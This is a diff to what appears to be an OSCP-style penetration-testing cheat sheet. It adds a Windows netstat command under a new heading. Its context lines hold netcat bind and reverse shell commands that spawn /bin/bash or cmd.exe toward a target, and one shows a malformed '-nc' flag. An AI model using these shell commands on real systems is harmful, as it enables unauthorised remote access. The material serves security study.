@@ -38,6 +38,7 @@ Previous Play Icon:
   - [Github](#github)
 - [General Unix Commands](#general-unix-commands)
   - [Netcat](#netcat)
+- [General Windows CMD Commands](#general-windows-cmd-commands)
 - [OSCP Specefic Commands](#oscp-specefic-commands)
 - [OSINT and Passive Information Gathering](#osint-and-passive-information-gathering)
 
@@ -668,6 +669,12 @@ nc -nlvp [port] -e /bin/bash
 nc -nc [target] [port] -e cmd.exe
 # send a reverse shell (linux)
 nc -nc [target] [port] -e /bin/bash
+```
+
+# General Windows CMD Commands
+```windows cmd
+# search for running services
+c:\user> netstat -an|find "[port]"
 ```
 
 # OSCP Specefic Commands 
